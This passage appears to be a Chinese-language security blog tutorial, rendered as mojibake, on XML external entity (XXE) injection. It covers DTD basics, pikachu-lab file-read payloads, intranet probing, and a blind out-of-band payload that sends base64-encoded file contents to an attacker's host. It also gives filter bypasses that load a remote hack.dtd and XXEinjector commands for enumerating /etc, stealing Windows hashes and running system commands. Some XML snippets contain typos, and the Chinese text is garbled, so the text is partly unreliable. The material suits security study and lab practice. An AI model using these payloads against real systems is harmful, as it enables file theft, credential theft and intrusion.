Injectionï¼Œå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚\n\n### 2ã€XMLä¸HTMLçš„ä¸»è¦å·®å¼‚\n\nXMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚\n\nHTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚\n\nHTMLæ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLæ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚\n\n### 3ã€xmlç¤ºä¾‹\n\n```xml\n<!--æ–‡æ¡£ç±»å‹å®šä¹‰-->\n<!DOCTYPE note [\t<!--å®šä¹‰æ­¤æ–‡æ¡£æ—¶noteç±»å‹çš„æ–‡æ¡£-->\n<!ELEMENT note (to,from,heading,body)>\t<!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ -->\n<!ELEMENT to (#PCDATA)>\t\t\t<!--å®šä¹‰toå…ƒç´ ä¸º\"#PCDATA\"ç±»å‹-->\n<!ELEMENT from (#PCDATA)>\t\t<!--å®šä¹‰fromå…ƒç´ ä¸º\"#PCDATA\"ç±»å‹-->\n<!ELEMENT head (#PCDATA)>\t\t<!--å®šä¹‰headå…ƒç´ ä¸º\"#PCDATA\"ç±»å‹-->\n<!ELEMENT body (#PCDATA)>\t\t<!--å®šä¹‰bodyå…ƒç´ ä¸º\"#PCDATA\"ç±»å‹-->\n]]]>\n\n<!--æ–‡æ¡£å…ƒç´ -->\n<note>\n    <to>Dave</to>\n    <from>Tom</from>\n    <head>Reminder</head>\n    <body>You are a good man</body>\n</note>\n```\n\n## DTD\n\nDTDï¼šDocument Type Definition  å³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ï¼Œç”±äºå…¶æ”¯æŒçš„æ•°æ®ç±»å‹æœ‰é™ï¼Œæ— æ³•å¯¹å…ƒç´ æˆ–å±æ€§çš„å†…å®¹è¿›è¡Œè¯¦ç»†è§„èŒƒï¼Œåœ¨å¯è¯»æ€§å’Œå¯æ‰©å±•æ€§æ–¹é¢ä¹Ÿæ¯”ä¸ä¸ŠXML Schemaã€‚\n\nDTDä¸€èˆ¬è®¤ä¸ºæœ‰ä¸¤ç§å¼•ç”¨æˆ–å£°æ˜æ–¹å¼ï¼š\n\n- 1ã€å†…éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨XMLæ–‡æ¡£ä¸­ã€‚\n- 2ã€å¤–éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„DTDæ–‡ä»¶ï¼ˆ.dtdï¼‰ä¸­ã€‚\n\nDTDå®ä½“æœ‰ä»¥ä¸‹å‡ ç§å£°æ˜æ–¹å¼\n\n### å†…éƒ¨å®ä½“\n\n```xml\n<!DOCTYPE note [\n    <!ENTITY a \"admin\">\n]>\n<note>&a</note>\n<!-- admin -->\n```\n\n### å‚æ•°å®ä½“\n\n```xml\n<!DOCTYPE note> [\n    <!ENTITY % b \"<!ENTITY b1 \"awsl\">\">\n    %b;\n]>\n<note>&b1</note>\n<!-- awsl -->\n```\n\n- å‚æ•°å®ä½“ç”¨`% name`ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨`%name;`ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ã€‚\n- å…¶ä½™å®ä½“ç›´æ¥ç”¨`name`ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨`&name;`ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼Œå¯åœ¨xmlæ–‡æ¡£ä¸­å¼•ç”¨\n\n### å¤–éƒ¨å®ä½“\n\n```xml\n<!DOCTYPE note> [\n    <!ENTITY c SYSTEM \"php://filter/read=convert.base64-encode/resource=flag.php\">\n]>\n<note>&c</note>\n<!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== -->\n```\n\nå¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒï¼Œä½†å­˜åœ¨ä¸€äº›é€šç”¨çš„åè®®ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n![image-20230729103931875](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729103931875.png)\n\nä¸Šå›¾æ˜¯é»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥æ”¯æŒå…¶ä»–ï¼Œå¦‚PHPæ”¯æŒçš„æ‰©å±•åè®®æœ‰\n\n![image-20230805163325966](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163325966.png)\n\n### é¶åœºè®²è§£ (pikachu xxeæ¼æ´)\n\n![image-20230729102633777](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729102633777.png)\n\n1. æ–‡ä»¶è¯»å–\n\n```xml\n<?xml version=\"1.0\"?> \n<!DOCTYPE foo [    \n<!ENTITY xxe SYSTEM \"file:///d:/test.txt\" > ]> \n<foo>&xxe;</foo>\n```\n\n![image-20230805163353148](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163353148.png)\n\n2. å†…ç½‘æ¢é’ˆæˆ–æ”»å‡»å†…ç½‘åº”ç”¨ï¼ˆè§¦å‘æ¼æ´åœ°å€ï¼‰\n\n```xml\n<?xml version = \"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTYTY rabbit SYSTEM \"http://192.168.1.4:80/index.txt\">\n]>\n<foo>&rabbit;</foo>\n```\n\nä¸Šé¢çš„ipåœ°å€å‡è®¾å°±æ˜¯å†…ç½‘çš„ä¸€å°æœåŠ¡å™¨çš„ipåœ°å€ã€‚è¿˜å¯ä»¥è¿›è¡Œä¸€ä¸ªç«¯å£æ‰«æï¼Œçœ‹ä¸€ä¸‹ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚\n\n**æ— å›æ˜¾-è¯»å–æ–‡ä»¶**\n\n```xml-dtd\n<?xml version = \"1.0\"?>\n<!DOCTYPE test [\n\t\t<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=d:/test.txt\">\n\t\t<!ENTITY % dtd SYSTEM \"http://192.168.xx.xxx:80XX/test.dtd\">\n\t\t%dtd;\n\t\t%send;\n]>\n\n\ntest.dtd:\n<!ENTITY % payload\n\t\"<!ENTITY &#x25; send SYSTEM\n'http://192.168.xx.xxx:80xx/?data=%file;'>\"\n>\n%payload;\n```\n\nä¸Šé¢çš„urlä¸€èˆ¬æ˜¯è‡ªå·±çš„ç½‘ç«™ï¼Œé€šè¿‡ç¬¬ä¸€æ­¥è®¿é—®æ–‡ä»¶ï¼Œç„¶åå†è®¿é—®dtdæ–‡ä»¶ï¼ŒæŠŠè¯»å–åˆ°çš„æ•°æ®èµ‹ç»™dataï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦å†è‡ªå·±çš„ç½‘ç«™æ—¥å¿—ï¼Œæˆ–è€…å†™ä¸ªphpè„šæœ¬ä¿å­˜ä¸‹æ¥ï¼Œå°±èƒ½çœ‹åˆ°è¯»å–åˆ°çš„æ–‡ä»¶æ•°æ®äº†ã€‚\n\n## ç»•è¿‡\n\n### ENTITY SYSTEM fileç­‰å…³é”®è¯è¢«è¿‡æ»¤\n\nä½¿ç”¨ç¼–ç æ–¹å¼ç»•è¿‡ï¼šUTF-16BE\n `cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml`\n\nè‹¥httpè¢«è¿‡æ»¤ï¼Œå¯ä»¥\n\n### data://åè®®ç»•è¿‡\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a \" <!ENTITY %  b SYSTEM 'http://118.25.14.40:8200/hack.dtd'> \"> \n    %a;\n    %b;\n]>\n<test>&hhh;</test>\n```\n\n### file://åè®®åŠ æ–‡ä»¶ä¸Šä¼ \n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a SYSTEM \"file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\">\n    %a;\n]>\n<!--ä¸Šä¼ æ–‡ä»¶-->\n<!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'>\n```\n\n## php://filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ \n\n\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a SYSTEM \"php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\">\n    %a;\n]>\n    <test>\n        &hhh;\n    </test>\n\n<!--ä¸Šä¼ æ–‡ä»¶-->\n<!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'>\n```\n\n\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a SYSTEM \"php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\">\n    %a;\n]>\n    <test>\n        &hhh;\n    </test>\n<!--ä¸Šä¼ æ–‡ä»¶-->\nPCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==\n```\n\n#  xxeå·¥å…·\n\nâ€‹          XXEinjectoræœ¬èº«æä¾›äº†éå¸¸éå¸¸ä¸°å¯Œçš„æ“ä½œé€‰é¡¹ï¼Œæ‰€ä»¥å¤§å®¶åœ¨åˆ©ç”¨XXEinjectorè¿›è¡Œæ¸—é€æµ‹è¯•ä¹‹å‰ï¼Œè¯·è‡ªä¹ äº†è§£è¿™äº›é…ç½®é€‰é¡¹ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‘æŒ¥XXEinjectorçš„åŠŸèƒ½ã€‚å½“ç„¶äº†ï¼Œç”±äºXXEinjectoræ˜¯åŸºäºRubyå¼€å‘çš„ï¼Œæ‰€ä»¥Rubyè¿è¡Œç¯å¢ƒå°±æ˜¯å¿…é¡»çš„äº†ã€‚è¿™é‡Œå»ºè®®åœ¨kaliç¯å¢ƒä¸‹è¿è¡Œã€‚\n\n## å‚æ•°è¯´æ˜\n\n```bash\n--host     \t\t\tå¿…å¡«é¡¹â€“ ç”¨äºå»ºç«‹åå‘é“¾æ¥çš„IPåœ°å€ã€‚(--host=192.168.0.2)\n--file      \t\tå¿…å¡«é¡¹- åŒ…å«æœ‰æ•ˆHTTPè¯·æ±‚çš„XMLæ–‡ä»¶ã€‚(--file=/tmp/req.txt)\n--path           å¿…å¡«é¡¹-æ˜¯å¦éœ€è¦æšä¸¾ç›®å½• â€“ æšä¸¾è·¯å¾„ã€‚(--path=/etc)\n--brute          å¿…å¡«é¡¹-æ˜¯å¦éœ€è¦çˆ†ç ´æ–‡ä»¶ -çˆ†ç ´æ–‡ä»¶çš„è·¯å¾„ã€‚(--brute=/tmp/brute.txt)\n--logger        \tè®°å½•è¾“å‡ºç»“æœã€‚\n--rhost          è¿œç¨‹ä¸»æœºIPæˆ–åŸŸååœ°å€ã€‚(--rhost=192.168.0.3)\n--rport          è¿œç¨‹ä¸»æœºçš„TCPç«¯å£ä¿¡æ¯ã€‚(--rport=8080)\n--phpfilter    \tåœ¨å‘é€æ¶ˆæ¯ä¹‹å‰ä½¿ç”¨PHPè¿‡æ»¤å™¨å¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡ŒBase64ç¼–ç ã€‚\n--netdoc     \t\tä½¿ç”¨netdocåè®®ã€‚(Java).\n--enumports   æšä¸¾ç”¨äºåå‘é“¾æ¥çš„æœªè¿‡æ»¤ç«¯å£ã€‚(--enumports=21,22,80,443,445)\n--hashes       çªƒå–è¿è¡Œå½“å‰åº”ç”¨ç¨‹åºç”¨æˆ·çš„Windowså“ˆå¸Œã€‚\n--expect        ä½¿ç”¨PHP expectæ‰©å±•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚(--expect=ls)\n--upload       ä½¿ç”¨Java jarå‘ä¸´æ—¶ç›®å½•ä¸Šä¼ æ–‡ä»¶ã€‚(--upload=/tmp/upload.txt)\n--xslt      \t\tXSLTæ³¨å…¥æµ‹è¯•ã€‚\n--ssl              ä½¿ç”¨SSLã€‚\n--proxy         ä½¿ç”¨ä»£ç†ã€‚(--proxy=127.0.0.1:8080)\n--httpport \t\tSetè‡ªå®šä¹‰HTTPç«¯å£ã€‚(--httpport=80)\n--ftpport       è®¾ç½®è‡ªå®šä¹‰FTPç«¯å£ã€‚(--ftpport=21)\n--gopherport  è®¾ç½®è‡ªå®šä¹‰gopherç«¯å£ã€‚(--gopherport=70)\n--jarport       è®¾ç½®è‡ªå®šä¹‰æ–‡ä»¶ä¸Šä¼ ç«¯å£ã€‚(--jarport=1337)\n--xsltport  \tè®¾ç½®è‡ªå®šä¹‰ç”¨äºXSLTæ³¨å…¥æµ‹è¯•çš„ç«¯å£ã€‚(--xsltport=1337)\n--test     \t\tè¯¥æ¨¡å¼å¯ç”¨äºæµ‹è¯•è¯·æ±‚çš„æœ‰æ•ˆã€‚\n--urlencode     URLç¼–ç ï¼Œé»˜è®¤ä¸ºURIã€‚\n--output       çˆ†ç ´æ”»å‡»ç»“æœè¾“å‡ºå’Œæ—¥å¿—ä¿¡æ¯ã€‚(--output=/tmp/out.txt)\n--timeout     è®¾ç½®æ¥æ”¶æ–‡ä»¶/ç›®å½•å†…å®¹çš„Timeoutã€‚(--timeout=20)\n--contimeout  è®¾ç½®ä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥çš„ï¼Œé˜²æ­¢DoSå‡ºç°ã€‚(--contimeout=20)\n--fast     \t\tè·³è¿‡æšä¸¾è¯¢é—®ï¼Œæœ‰å¯èƒ½å‡ºç°ç»“æœå‡é˜³æ€§ã€‚\n--verbose     æ˜¾ç¤ºverboseä¿¡æ¯ã€‚\n```\n\n## å·¥å…·ä½¿ç”¨\n\næšä¸¾HTTPSåº”ç”¨ç¨‹åºä¸­çš„/etcç›®å½•ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt â€“ssl\n```\n\nä½¿ç”¨gopherï¼ˆOOBæ–¹æ³•ï¼‰æšä¸¾/etcç›®å½•ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher\n```\n\näºŒæ¬¡æ¼æ´åˆ©ç”¨ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt\n```\n\nä½¿ç”¨HTTPå¸¦å¤–æ–¹æ³•å’Œnetdocåè®®å¯¹æ–‡ä»¶è¿›è¡Œçˆ†ç ´æ”»å‡»ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http â€“netdoc\n```\n\né€šè¿‡ç›´æ¥æ€§æ¼æ´åˆ©ç”¨æ–¹å¼è¿›è¡Œèµ„æºæšä¸¾ï¼š\n\n```bash\nruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK\n```\n\næšä¸¾æœªè¿‡æ»¤çš„ç«¯å£ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all\n```\n\nçªƒå–Windowså“ˆå¸Œï¼š\n\n```bash\nruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt â€“hashes\n```\n\nä½¿ç”¨Java jarä¸Šä¼ æ–‡ä»¶ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf\n```\n\nä½¿ç”¨PHP expectæ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls\n```\n\næµ‹è¯•XSLTæ³¨å…¥ï¼š\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt â€“xslt\n```\n\nè®°å½•è¯·æ±‚ä¿¡æ¯ï¼š\n\n```bash\nruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt\n```\n\n","tags":["XML","XXE"],"categories":["Web"]}]